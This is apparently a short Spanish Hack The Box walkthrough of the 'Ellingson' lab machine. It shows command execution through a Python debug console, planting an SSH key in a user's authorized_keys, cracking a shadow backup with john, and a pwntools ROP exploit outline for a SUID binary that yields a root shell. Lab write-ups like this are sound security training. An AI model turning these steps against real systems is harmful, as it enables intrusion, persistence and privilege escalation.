# Ellingson - Hack The Box Walkthrough

**IP:** 10.10.10.139

---

## 1. Inicial - Debug RCE en Artículos
```http
http://Ellingson.htb/articles/4
```
- Se encontró código ejecutable vía `os.popen()` en Python.

```python
os.popen("whoami").read()
```

---

## 2. Enumeración de Usuarios
```python
os.popen("ls -l /home").read()
```
- Usuarios: duke, hal, margo, theplague

---

## 3. SSH con clave pública
- Hal tiene acceso SSH.
- Se genera una clave con `ssh-keygen` y se sube con:
```python
echo 'clave_publica' > /home/hal/.ssh/authorized_keys
```

---

## 4. Acceso a /var/backups/shadow.bak
- Archivo legible por grupo `adm`, del cual hal es parte.
- Se usa `john` para crackear los hashes.
- Contraseña de `margo`: `passw$08`

---

## 5. SSH como margo
```bash
sshpass -p 'passw$08' ssh margo@ellingson.htb
```

---

## 6. Binary SUID `/usr/bin/garbage`
- Solicita contraseña: `N3veRF3@passw!` (obtenida vía ltrace)
```bash
/usr/bin/garbage
```

---

## 7. Ingeniería Reversa del binario
```bash
scp margo@Ellingson.htb:/usr/bin/garbage .
scp margo@Ellingson.htb:/lib/x86_64-linux-gnu/libc.so.6 .
```

```bash
checksec garbage
# NX: ENABLED
```

---

## 8. Explotación con ROP
- Se crea exploit en Python usando pwntools para:
  1. **Filtrar** dirección de `__libc_start_main`
  2. Calcular base de `libc`
  3. Ejecutar `/bin/sh` como root con `setuid(0)` y `system("/bin/sh")`

---

## 9. Exploit en Python
```python
r = ssh(host='ellingson.htb', user='margo', password='passw$08')
p = r.process('/usr/bin/garbage')

elf = ELF("./garbage")
libc = ELF("./libc.so.6")
rop = ROP(elf)

leak = leak(p, elf, libc, rop)
libc.address = leak - libc.sym["__libc_start_main"]

root_shell(p, elf, libc, rop)
```

---

✅ **Root access obtenido.**
